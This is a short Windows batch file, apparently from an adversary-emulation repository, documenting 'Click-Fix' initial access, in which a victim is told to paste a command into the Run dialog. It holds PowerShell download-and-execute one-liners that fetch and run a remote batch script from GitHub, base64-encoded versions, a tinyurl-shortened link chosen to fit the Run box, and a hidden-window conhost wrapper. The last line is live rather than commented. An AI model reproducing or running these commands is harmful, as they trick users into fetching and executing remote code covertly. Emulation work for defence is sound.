:: Initial Access through Click-Fix
:: Open Run Terminal and paste the below code


:: Iteration 1:
:: 		powershell.exe -c "iex (iwr -uri https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/taskScheduler.bat' -UseBasicParsing).Content"
::		powershell.exe -enc SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8ATABlAE0AYQBnAGkAYwBLAG8AbgBjAGgALwBCAEwAdQBlAFQAZQBhAG0ATwBwAHMALwByAGEAdwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AQQBkAHYAZQByAHMAYQByAHkAIABFAG0AdQBsAGEAdABpAG8AbgAvAHQAYQBzAGsAUwBjAGgAZQBkAHUAbABhAHIALgBiAGEAdAAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApAC4AQwBvAG4AdABlAG4AdAA=

:: Iteration 2:
::		Needed to use a URL shortener to fit the command in the run dialog box. I used "tinyurl"
::			Original URL --> https://raw.githubusercontent.com/LeMagicKonch/BlueTeamOps/f755083e31c8b803c331f94d906535a8593ba3e4/Adversary%20Emulation/taskSchedular.bat
::			Compressed URL --> https://tinyurl.com/mvyej24r
::		Command:
:: 			powershell.exe -c "iex (iwr -uri https://tinyurl.com/mvyej24r -UseBasicParsing).Content"
::		Encoded Command:
::			conhost.exe cmd.exe /c "powershell.exe -w H -e SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AdABpAG4AeQB1AHIAbAAuAGMAbwBtAC8AbQB2AHkAZQBqADIANAByACAAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0AA== /W 1"

conhost.exe cmd.exe /c "powershell.exe -w H -e SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AdABpAG4AeQB1AHIAbAAuAGMAbwBtAC8AbQB2AHkAZQBqADIANAByACAAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0AA== /W 1"

